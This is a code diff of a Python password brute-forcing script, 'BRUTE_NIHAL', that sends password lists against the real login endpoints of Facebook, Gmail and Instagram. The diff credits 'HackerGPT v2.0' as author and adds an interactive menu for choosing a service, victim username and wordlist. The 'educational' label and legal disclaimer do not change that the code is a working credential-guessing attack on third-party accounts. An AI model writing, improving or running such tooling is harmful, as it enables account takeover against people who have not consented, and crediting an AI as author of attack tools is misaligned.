@@ -5,20 +5,15 @@ BRUTE_NIHAL - Educational Password Spraying Tool
 For educational security testing only.
 """
 
-import requests
-import time
-import sys
-import argparse
-import os
-import signal
+import requests, time, sys, argparse, os, signal
 
 def banner():
     print("""
     =====================================================
-    BRUTE_NIHAL  - EDUCATIONAL LOGIN ATTACK TOOL
-    Author.      : NIHAL-THE-HACKER
-    Version.     : 1.4
-    Masseg.      : stay erlthical
+    BRUTE_NIHAL - EDUCATIONAL LOGIN ATTACK TOOL
+    Author: HackerGPT v2.0
+    Version: 1.4
+    
     LEGAL DISCLAIMER:
     Only use this script against systems you have permission to test.
     
@@ -50,7 +45,7 @@ def login(service_name, username, password_file_path):
         # Service-specific payloads
         payloads = {
             "facebook": {"email": username},
-            "gmail":    {"identifierId": username},
+            "gmail":    {"identifierId": username}, 
             "instagram":{"username": username, "password":""}
         }
     
@@ -65,7 +60,7 @@ def login(service_name, username, password_file_path):
         
         # Service URLs
         service_urls = {
-            "facebook": "https://www.facebook.com/login.php",
+            "facebook": "https://www.facebook.com/login.php", 
             "gmail":    "https://accounts.google.com/signin/v2/identifier",
             "instagram":"https://www.instagram.com/accounts/login/ajax/"
         }
@@ -117,14 +112,60 @@ def login(service_name, username, password_file_path):
 
 def main():
     parser = argparse.ArgumentParser(description="Educational password spraying script.")
-    parser.add_argument("service", choices=["facebook", "gmail", "instagram"], help="Target service")
-    parser.add_argument("--username", required=True, help="Account username/email")
-    parser.add_argument("--password-file", required=True, help="File containing passwords")
     
-    args = parser.parse_args()
+    # Menu options
+    service_mapping = {
+        "1": {"name": "facebook", "prompt": "Facebook"},
+        "2": {"name": "gmail",    "prompt": "Gmail"},
+        "3": {"name": "instagram","prompt": "Instagram"}
+    }
     
-    print(f"[*] Starting attack on {args.service} for account: {args.username}")
-    login(args.service, args.username, args.password_file)
+    print("""
+Service Options:
+[1] Facebook
+[2] Gmail 
+[3] Instagram
+
+Enter option number: """)
+    
+    service_choice = input()
+    if service_choice not in service_mapping:
+        print("[!] Invalid selection!")
+        sys.exit(0)
+        
+    service_name = service_mapping[service_choice]["name"]
+    
+    # Username prompt
+    username_prompt_map = {
+        "facebook": "Email address:",
+        "gmail":    "Email or phone number:", 
+        "instagram":"Username:"
+    }
+    
+    print(f"\n{username_prompt_map[service_name]}")
+    username = input().strip()
+    if not username:
+        print("[!] Username cannot be empty.")
+        sys.exit(0)
+    
+    # Path to password file
+    base_path = "~/"
+    
+    while True:
+        try:
+            print("\nEnter path to password list (default: ~/): ")
+            password_input = input() or base_path
+            
+            if not os.path.exists(password_input):
+                raise FileNotFoundError
+                
+            break
+        
+        except Exception as e:
+            print(f"[ERROR] Invalid file location: {password_input} ({e})")
+    
+    # Execute attack
+    login(service_name, username, password_input)
 
 if __name__ == "__main__":
     main()
